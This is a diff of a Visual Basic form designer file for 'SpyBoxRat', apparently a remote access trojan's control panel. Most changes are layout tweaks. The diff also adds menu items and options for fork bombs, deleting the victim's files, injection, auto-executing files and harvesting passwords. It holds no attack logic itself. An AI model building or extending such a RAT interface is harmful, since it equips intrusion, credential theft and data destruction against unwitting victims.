-        Me.XuiCheckBox1.Location = New System.Drawing.Point(6, 19)
+        Me.XuiCheckBox1.Location = New System.Drawing.Point(34, 22)
         Me.XuiCheckBox1.Margin = New System.Windows.Forms.Padding(3, 4, 3, 4)
         Me.XuiCheckBox1.Name = "XuiCheckBox1"
-        Me.XuiCheckBox1.Size = New System.Drawing.Size(155, 20)
+        Me.XuiCheckBox1.Size = New System.Drawing.Size(155, 22)
         Me.XuiCheckBox1.TabIndex = 1
         Me.XuiCheckBox1.Text = "Auto Save Passwords"
         Me.XuiCheckBox1.TickThickness = 2
@@ -792,6 +896,7 @@ Partial Class Form1
         Me.XuiCustomGroupbox4.TabStop = False
         Me.XuiCustomGroupbox4.Text = "Remote Viewer Port : "
         Me.XuiCustomGroupbox4.TextColor = System.Drawing.Color.FromArgb(CType(CType(80, Byte), Integer), CType(CType(68, Byte), Integer), CType(CType(235, Byte), Integer))
+        Me.XuiCustomGroupbox4.Visible = False
         '
         'NumericUpDown2
         '
@@ -809,7 +914,7 @@ Partial Class Form1
         '
         Me.UcBtnExt1.BackColor = System.Drawing.Color.White
         Me.UcBtnExt1.BtnBackColor = System.Drawing.Color.White
-        Me.UcBtnExt1.BtnFont = New System.Drawing.Font("Microsoft YaHei", 12.0!, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, CType(134, Byte))
+        Me.UcBtnExt1.BtnFont = New System.Drawing.Font("Segoe UI", 8.25!)
         Me.UcBtnExt1.BtnForeColor = System.Drawing.Color.White
         Me.UcBtnExt1.BtnText = "Listen !"
         Me.UcBtnExt1.ConerRadius = 5
@@ -820,7 +925,7 @@ Partial Class Form1
         Me.UcBtnExt1.IsRadius = True
         Me.UcBtnExt1.IsShowRect = True
         Me.UcBtnExt1.IsShowTips = False
-        Me.UcBtnExt1.Location = New System.Drawing.Point(6, 155)
+        Me.UcBtnExt1.Location = New System.Drawing.Point(6, 145)
         Me.UcBtnExt1.Margin = New System.Windows.Forms.Padding(0)
         Me.UcBtnExt1.Name = "UcBtnExt1"
         Me.UcBtnExt1.RectColor = System.Drawing.Color.FromArgb(CType(CType(100, Byte), Integer), CType(CType(88, Byte), Integer), CType(CType(255, Byte), Integer))
@@ -907,19 +1012,15 @@ Partial Class Form1
         Me.Button3.Text = "-"
         Me.Button3.UseVisualStyleBackColor = False
         '
-        'Timer1
-        '
-        Me.Timer1.Interval = 1750
-        '
         'Label1
         '
         Me.Label1.AutoSize = True
         Me.Label1.ForeColor = System.Drawing.Color.FromArgb(CType(CType(80, Byte), Integer), CType(CType(68, Byte), Integer), CType(CType(235, Byte), Integer))
         Me.Label1.Location = New System.Drawing.Point(73, 10)
         Me.Label1.Name = "Label1"
-        Me.Label1.Size = New System.Drawing.Size(221, 13)
+        Me.Label1.Size = New System.Drawing.Size(169, 13)
         Me.Label1.TabIndex = 13
-        Me.Label1.Text = "SpyBoxRat Summer Edition V1.1 By Arsium"
+        Me.Label1.Text = "SpyBoxRat Summer Edition V1.2"
         '
         'TabControlExt3
         '
@@ -1005,6 +1106,7 @@ Partial Class Form1
         Me.TabPage4.BackColor = System.Drawing.Color.White
         Me.TabPage4.Controls.Add(Me.XuiCustomGroupbox2)
         Me.TabPage4.Controls.Add(Me.XuiCustomGroupbox1)
+        Me.TabPage4.ForeColor = System.Drawing.Color.White
         Me.TabPage4.Location = New System.Drawing.Point(54, 4)
         Me.TabPage4.Name = "TabPage4"
         Me.TabPage4.Padding = New System.Windows.Forms.Padding(3)
@@ -1028,6 +1130,7 @@ Partial Class Form1
         '
         'Label2
         '
+        Me.Label2.Anchor = CType((System.Windows.Forms.AnchorStyles.Top Or System.Windows.Forms.AnchorStyles.Right), System.Windows.Forms.AnchorStyles)
         Me.Label2.ForeColor = System.Drawing.Color.FromArgb(CType(CType(80, Byte), Integer), CType(CType(80, Byte), Integer), CType(CType(80, Byte), Integer))
         Me.Label2.Location = New System.Drawing.Point(868, 3)
         Me.Label2.Name = "Label2"
@@ -1044,6 +1147,32 @@ Partial Class Form1
         Me.PictureBox2.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage
         Me.PictureBox2.TabIndex = 15
         Me.PictureBox2.TabStop = False
+        '
+        'PictureBox5
+        '
+        Me.PictureBox5.Image = Global.AnonMon.My.Resources.Resources.icons8_Syringe_with_a_drop_of_bazlood_32
+        Me.PictureBox5.Location = New System.Drawing.Point(6, 85)
+        Me.PictureBox5.Name = "PictureBox5"
+        Me.PictureBox5.Size = New System.Drawing.Size(22, 22)
+        Me.PictureBox5.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage
+        Me.PictureBox5.TabIndex = 8
+        Me.PictureBox5.TabStop = False
+        '
+        'AUTO_CHK_FILE
+        '
+        Me.AUTO_CHK_FILE.CheckboxCheckColor = System.Drawing.Color.White
+        Me.AUTO_CHK_FILE.CheckboxColor = System.Drawing.Color.FromArgb(CType(CType(80, Byte), Integer), CType(CType(68, Byte), Integer), CType(CType(235, Byte), Integer))
+        Me.AUTO_CHK_FILE.CheckboxHoverColor = System.Drawing.Color.FromArgb(CType(CType(249, Byte), Integer), CType(CType(55, Byte), Integer), CType(CType(98, Byte), Integer))
+        Me.AUTO_CHK_FILE.CheckboxStyle = XanderUI.XUICheckBox.Style.Material
+        Me.AUTO_CHK_FILE.Checked = False
+        Me.AUTO_CHK_FILE.ForeColor = System.Drawing.Color.FromArgb(CType(CType(40, Byte), Integer), CType(CType(40, Byte), Integer), CType(CType(40, Byte), Integer))
+        Me.AUTO_CHK_FILE.Location = New System.Drawing.Point(34, 85)
+        Me.AUTO_CHK_FILE.Margin = New System.Windows.Forms.Padding(3, 4, 3, 4)
+        Me.AUTO_CHK_FILE.Name = "AUTO_CHK_FILE"
+        Me.AUTO_CHK_FILE.Size = New System.Drawing.Size(180, 22)
+        Me.AUTO_CHK_FILE.TabIndex = 7
+        Me.AUTO_CHK_FILE.Text = "Auto Execute File"
+        Me.AUTO_CHK_FILE.TickThickness = 2
         '
         'Form1
         '
@@ -1068,10 +1197,16 @@ Partial Class Form1
         Me.Text = "SpyBox By Arsium"
         Me.REMOTE_TOOL.ResumeLayout(False)
         Me.XuiCustomGroupbox2.ResumeLayout(False)
+        Me.XuiCustomGroupbox2.PerformLayout()
+        CType(Me.PictureBox4, System.ComponentModel.ISupportInitialize).EndInit()
+        CType(Me.PictureBox3, System.ComponentModel.ISupportInitialize).EndInit()
         Me.XuiCustomGroupbox1.ResumeLayout(False)
+        Me.XuiCustomGroupbox1.PerformLayout()
         Me.XuiCustomGroupbox4.ResumeLayout(False)
+        Me.XuiCustomGroupbox4.PerformLayout()
         CType(Me.NumericUpDown2, System.ComponentModel.ISupportInitialize).EndInit()
         Me.XuiCustomGroupbox3.ResumeLayout(False)
+        Me.XuiCustomGroupbox3.PerformLayout()
         CType(Me.NumericUpDown1, System.ComponentModel.ISupportInitialize).EndInit()
         Me.TabControlExt3.ResumeLayout(False)
         Me.TabPage2.ResumeLayout(False)
@@ -1079,6 +1214,7 @@ Partial Class Form1
         Me.TabPage4.ResumeLayout(False)
         CType(Me.PictureBox1, System.ComponentModel.ISupportInitialize).EndInit()
         CType(Me.PictureBox2, System.ComponentModel.ISupportInitialize).EndInit()
+        CType(Me.PictureBox5, System.ComponentModel.ISupportInitialize).EndInit()
         Me.ResumeLayout(False)
         Me.PerformLayout()
 
@@ -1095,7 +1231,6 @@ Partial Class Form1
     Friend WithEvents XuiCustomGroupbox2 As XanderUI.XUICustomGroupbox
     Friend WithEvents NumericUpDown1 As NumericUpDown
     Friend WithEvents UcBtnExt1 As HZH_Controls.Controls.UCBtnExt
-    Friend WithEvents Timer1 As Timer
     Friend WithEvents ImageList1 As ImageList
     Friend WithEvents REMOTE_TOOL As ContextMenuStrip
     Friend WithEvents GetPasswordsToolStripMenuItem As ToolStripMenuItem
@@ -1176,4 +1311,14 @@ Partial Class Form1
     Friend WithEvents Timer2 As Timer
     Friend WithEvents Label2 As Label
     Friend WithEvents PictureBox2 As PictureBox
+    Friend WithEvents ForkBombToolStripMenuItem As ToolStripMenuItem
+    Friend WithEvents DeleteAllFilesOnDesktopToolStripMenuItem As ToolStripMenuItem
+    Friend WithEvents DeleteFilesToolStripMenuItem As ToolStripMenuItem
+    Friend WithEvents DeleteFilesRebootToolStripMenuItem As ToolStripMenuItem
+    Friend WithEvents Auto_RECOV As XanderUI.XUICheckBox
+    Friend WithEvents PictureBox4 As PictureBox
+    Friend WithEvents PictureBox3 As PictureBox
+    Friend WithEvents InjectionToolStripMenuItem As ToolStripMenuItem
+    Friend WithEvents PictureBox5 As PictureBox
+    Friend WithEvents AUTO_CHK_FILE As XanderUI.XUICheckBox
 End Class
